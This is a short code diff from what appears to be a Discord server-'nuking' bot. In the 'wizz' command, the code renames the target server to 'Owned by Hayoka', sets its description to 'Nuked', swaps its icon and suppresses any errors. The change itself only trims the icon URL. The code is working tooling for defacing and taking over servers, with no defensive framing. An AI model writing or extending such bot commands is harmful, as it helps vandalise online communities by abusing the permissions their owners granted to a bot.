@@ -498,7 +498,7 @@ async def wizz(ctx):
     try:
         await ctx.guild.edit(name='Owned by Hayoka', description='Nuked',
           reason='Lame Server',
-          icon='https://cdn.discordapp.com/attachments/1197503521570963547/1220051975908102276/sj.jpg?ex=660d88f2&is=65fb13f2&hm=b48dea75a568a79f3618628e7d0a8983969fe68e4a2c3173b80e3f5258be81d4&',
+          icon='https://cdn.discordapp.com/attachments/1197503521570963547/1220051975908102276/sj.jpg',
           banner=None)
     except:
         pass
